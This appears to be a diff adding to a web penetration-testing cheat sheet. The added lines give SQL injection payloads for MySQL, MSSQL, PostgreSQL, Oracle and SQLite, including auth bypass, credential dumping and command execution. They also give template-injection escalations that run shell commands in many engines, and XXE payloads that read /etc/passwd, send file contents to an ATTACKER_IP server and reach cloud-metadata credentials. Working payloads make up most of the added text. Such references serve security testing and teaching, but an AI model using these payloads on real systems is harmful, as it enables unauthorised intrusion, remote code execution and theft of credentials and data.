@@ -13,6 +13,71 @@ Quick review of what to test manually for each vuln type before automating anyth
 7. **Second order**: data stored "clean" in one place and used unsanitized in a different query elsewhere.
 8. **NoSQL injection** (Mongo, etc.): try operators like `{"$ne": null}`, `{"$gt": ""}` in the JSON body; on a classic login form try `username[$ne]=x&password[$ne]=x` if it's form-encoded.
 
+### Basic payloads per database
+
+**Auth bypass (any DBMS)** — in the username/password field of a login form:
+
+```
+' OR '1'='1
+' OR 1=1-- -
+admin'-- -
+admin'#
+' OR '1'='1'/*
+") OR ("1"="1
+```
+
+**Comment syntax** (how to kill the rest of the query):
+
+| DBMS       | Inline comment     | Notes                                  |
+|------------|--------------------|----------------------------------------|
+| MySQL      | `-- -`, `#`, `/* */`| `-- ` needs a trailing space (use `-- -`) |
+| MSSQL      | `-- `, `/* */`      |                                        |
+| PostgreSQL | `-- `, `/* */`      |                                        |
+| Oracle     | `-- `               | no `#`; every statement needs `FROM`   |
+| SQLite     | `-- `, `/* */`      |                                        |
+
+**MySQL / MariaDB**
+```sql
+' UNION SELECT @@version,user(),database()-- -
+' AND SLEEP(5)-- -
+' UNION SELECT table_name,2 FROM information_schema.tables-- -
+' UNION SELECT group_concat(username,0x3a,password),2 FROM users-- -
+' AND extractvalue(1,concat(0x7e,(SELECT @@version)))-- -   # error-based
+```
+
+**Microsoft SQL Server (MSSQL)**
+```sql
+' UNION SELECT @@version,SYSTEM_USER-- -
+'; WAITFOR DELAY '0:0:5'-- -
+' AND 1=CONVERT(int,(SELECT @@version))-- -                 # error-based
+'; EXEC xp_cmdshell 'whoami'-- -                            # RCE if xp_cmdshell enabled
+' UNION SELECT name,2 FROM sysobjects WHERE xtype='U'-- -    # list tables
+```
+
+**PostgreSQL**
+```sql
+' UNION SELECT version(),current_user-- -
+'; SELECT pg_sleep(5)-- -
+' AND 1=CAST((SELECT version()) AS int)-- -                 # error-based
+' UNION SELECT string_agg(usename,',') ,2 FROM pg_user-- -
+'; COPY (SELECT '') TO PROGRAM 'id'-- -                     # RCE if superuser
+```
+
+**Oracle** (needs `FROM dual`, no stacked queries by default)
+```sql
+' UNION SELECT banner,2 FROM v$version-- -
+' AND 1=(SELECT user FROM dual)-- -
+' AND 1=utl_inaddr.get_host_address((SELECT user FROM dual))-- -   # error-based OOB
+' UNION SELECT table_name,2 FROM all_tables-- -
+```
+
+**SQLite**
+```sql
+' UNION SELECT sqlite_version(),2-- -
+' UNION SELECT name,2 FROM sqlite_master WHERE type='table'-- -
+' AND 1=randomblob(100000000)-- -                           # heavy query = time-based proxy
+```
+
 ## SSTI (Server-Side Template Injection)
 
 1. **Detection polyglot**: `${{<%[%'"}}%\.` — if any character disappears or breaks the page, there's template parsing happening.
@@ -22,11 +87,23 @@ Quick review of what to test manually for each vuln type before automating anyth
    - Velocity: `#set($x=7*7)$x` → `49`
    - ERB (Ruby): `<%= 7*7 %>` → `49`
    - Smarty: `{7*7}` → `49`
+   - Mako (Python): `${7*7}` → `49`
+   - Thymeleaf (Java): `[[${7*7}]]` → `49`
+   - Handlebars/Pug: `{{7*7}}` stays literal → use `#{7*7}` (Pug) → `49`
+   - **Disambiguate** `{{7*7}}` (Jinja2) from `${7*7}` (Freemarker/Mako): send `{{7*'7'}}` → Jinja2 gives `7777777`, Twig gives `49`.
 3. **Escalating to RCE**:
    - Jinja2: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`
+   - Jinja2 (cycler gadget, when `self`/`request` filtered): `{{ cycler.__init__.__globals__.os.popen('id').read() }}`
    - Twig: `{{ ['id']|filter('system') }}`
    - Freemarker: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
+   - Velocity: `#set($e=$x.class.forName('java.lang.Runtime').getRuntime().exec('id'))`
+   - Smarty: `{system('id')}`
+   - ERB (Ruby): `<%= \`id\` %>` or `<%= system('id') %>`
+   - Mako (Python): `${__import__('os').popen('id').read()}`
+   - Thymeleaf: `__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x`
+   - Pebble (Java): `{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('id') }}`
 4. If `{{7*7}}` is reflected literally, there's no SSTI (probably XSS).
+5. **Blind SSTI**: no output reflected? Confirm with a time delay (Jinja2 `{{''.__class__.__mro__[1].__subclasses__()}}` on a slow sink) or an OOB callback (`curl http://ATTACKER_IP/`), same idea as blind SQLi/RCE.
 
 ## XXE (XML External Entity)
 
@@ -42,8 +119,41 @@ Quick review of what to test manually for each vuln type before automating anyth
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <foo>&xxe;</foo>
    ```
-4. **Blind XXE with exfil via external parameter** (when there's no direct reflection): use an external DTD hosted on your server that reads the file and sends it over HTTP.
-5. **SVG upload**: if the app allows SVG uploads and renders them server-side, that's a classic, often overlooked XXE vector.
+4. **Blind XXE with exfil via external parameter** (when there's no direct reflection): host an external DTD on your server that reads the file and beacons it back over HTTP.
+   ```xml
+   <!-- document sent to the target -->
+   <?xml version="1.0"?>
+   <!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://ATTACKER_IP:8000/evil.dtd"> %dtd;]>
+   <foo>bar</foo>
+   ```
+   ```xml
+   <!-- evil.dtd hosted on your server -->
+   <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+   <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_IP:8000/collect?d=%file;'>">
+   %eval;
+   %exfil;
+   ```
+5. **PHP filter wrapper** (read files that would otherwise break the XML parser, e.g. source with `<` `&`):
+   ```xml
+   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
+   <foo>&xxe;</foo>
+   ```
+6. **Parameter / billion-laughs DoS** sanity check (don't run against prod): nested entities that expand exponentially confirm the parser resolves entities at all.
+7. **XInclude** (when you only control part of the XML and can't define a DOCTYPE):
+   ```xml
+   <foo xmlns:xi="http://www.w3.org/2001/XInclude">
+     <xi:include parse="text" href="file:///etc/passwd"/>
+   </foo>
+   ```
+8. **SSRF via XXE**: point the entity at internal services or cloud metadata instead of a file:
+   `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">`.
+9. **SVG upload**: if the app allows SVG uploads and renders them server-side, that's a classic, often overlooked XXE vector:
+   ```xml
+   <?xml version="1.0"?>
+   <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
+   <svg xmlns="http://www.w3.org/2000/svg"><text x="0" y="20">&xxe;</text></svg>
+   ```
+10. **Other file formats that are secretly XML**: `.docx`/`.xlsx`/`.pptx` (unzip, edit a part, re-zip), `.svg`, RSS/Atom, SAML responses, SOAP bodies.
 
 ## SSRF (Server-Side Request Forgery)
 
